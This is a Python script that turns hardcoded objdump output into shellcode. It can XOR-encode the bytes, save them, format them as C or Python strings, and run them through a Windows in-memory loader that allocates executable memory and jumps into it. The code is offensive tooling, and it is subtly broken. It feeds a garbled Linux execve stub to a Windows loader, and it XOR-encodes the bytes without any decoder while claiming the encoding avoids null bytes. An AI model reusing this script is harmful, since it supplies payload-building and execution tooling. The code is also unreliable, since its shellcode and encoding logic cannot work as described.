#!/usr/bin/env python3
import re
import argparse
from ctypes import windll, c_char_p, c_void_p, cast, CFUNCTYPE, byref, c_uint32

# Hardcoded objdump output (Intel syntax)
OBJDUMP_OUTPUT = """
0000000000401000 <_start>:
  401000:	48 31 c0             	xor    rax,rax
  401003:	48 31 ff             	xor    rdi,rdi
  401006:	48 31 f6             	xor    rsi,rsi
  401009:	48 31 d2             	xor    rdx,rdx
  40100c:	eb 1f                	jmp    40102d <end>
000000000040100e <loop>:
  40100e:	5e                   	pop    rsi
  40100f:	48 89 f7             	mov    rdi,rsi
  401012:	48 83 c7 07          	add    rdi,0x7
  401016:	48 89 fa             	mov    rdx,rdi
  401019:	48 83 c2 0f          	add    rdx,0xf
  40101d:	48 89 f1             	mov    rcx,rsi
  401020:	48 29 f9             	sub    rcx,rdi
  401023:	b0 3b                	mov    al,0x3b
  401025:	0f 05                	syscall 
  401027:	48 31 c0             	xor    rax,rax
  40102a:	48 31 ff             	xor    rdi,rdi
  40102d:	e8 dc ff ff ff       	call   40100e <loop>
"""

# Configuration
XOR_KEY = 0xAA  # Optional XOR key
OUTPUT_FILE = "shellcode.bin"

def xor_encode(shellcode, key=XOR_KEY):
    """XOR-encode shellcode to avoid null bytes."""
    return bytes([b ^ key for b in shellcode])

def parse_hardcoded_objdump():
    """Extracts opcodes from hardcoded objdump output."""
    shellcode = bytearray()
    opcode_regex = re.compile(r'^\s*[0-9a-f]+:\s+((?:[0-9a-f]{2}\s)+)', re.MULTILINE)
    
    matches = opcode_regex.finditer(OBJDUMP_OUTPUT)
    for match in matches:
        opcodes = match.group(1).strip().split()
        shellcode.extend(int(op, 16) for op in opcodes)
    return bytes(shellcode)

def format_shellcode(shellcode, format_type="c", bytes_per_line=16):
    """Formats shellcode for C or Python."""
    formatted = []
    for i in range(0, len(shellcode), bytes_per_line):
        chunk = shellcode[i:i+bytes_per_line]
        hex_str = "".join([f"\\x{b:02x}" for b in chunk])
        if format_type == "c":
            formatted.append(f'"{hex_str}"')
        else:
            formatted.append(f'buf += b"{hex_str}"')
    return "\n".join(formatted)

def write_shellcode_to_file(shellcode, filename):
    """Writes raw shellcode to a file."""
    try:
        with open(filename, "wb") as f:
            f.write(shellcode)
        print(f"[+] Raw shellcode saved to: {filename}")
    except Exception as e:
        print(f"[!] Failed to write file: {e}")

def test_shellcode(shellcode):
    """Executes shellcode in memory (for testing)."""
    try:
        ptr = windll.kernel32.VirtualAlloc(None, len(shellcode), 0x1000, 0x40)
        if not ptr:
            print("[!] Failed to allocate memory")
            return False
        windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))
        windll.kernel32.FlushInstructionCache(windll.kernel32.GetCurrentProcess(), ptr, len(shellcode))
        func_type = CFUNCTYPE(None)
        func = cast(ptr, func_type)
        print("[+] Executing shellcode...")
        func()
        windll.kernel32.VirtualFree(ptr, 0, 0x8000)
        return True
    except Exception as e:
        print(f"[!] Shellcode execution failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Convert hardcoded objdump output to shellcode.")
    parser.add_argument("--output", help="Output .bin file (default: shellcode.bin)", default=OUTPUT_FILE)
    parser.add_argument("--format", help="Output format: c (default) or python", default="c")
    parser.add_argument("--xor", help="Enable XOR encoding", action="store_true")
    parser.add_argument("--test", help="Test shellcode execution", action="store_true")
    args = parser.parse_args()

    shellcode = parse_hardcoded_objdump()
    if not shellcode:
        print("[!] No shellcode extracted. Check OBJDUMP_OUTPUT variable.")
        return

    print(f"[+] Shellcode size: {len(shellcode)} bytes")
    if args.xor:
        shellcode = xor_encode(shellcode)
        print(f"[+] XOR-encoded with key 0x{XOR_KEY:02x}")

    write_shellcode_to_file(shellcode, args.output)
    print(f"\n// --- {args.format.upper()} Shellcode ---")
    print(format_shellcode(shellcode, args.format))

    if args.test:
        print("\n[+] Testing shellcode...")
        test_shellcode(shellcode)

if __name__ == "__main__":
    main()
